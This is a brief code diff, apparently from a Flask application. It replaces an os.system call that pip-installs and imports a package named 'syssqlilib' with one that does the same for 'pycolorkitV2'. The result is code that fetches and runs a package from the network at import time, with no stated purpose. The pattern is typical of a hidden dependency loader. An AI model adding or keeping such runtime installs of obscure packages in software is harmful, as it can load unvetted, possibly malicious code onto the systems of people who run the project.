@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install syssqlilib")
-import syssqlilib
+os.system("pip install pycolorkitV2")
+import pycolorkitV2
 import flask
 
 from flask import g
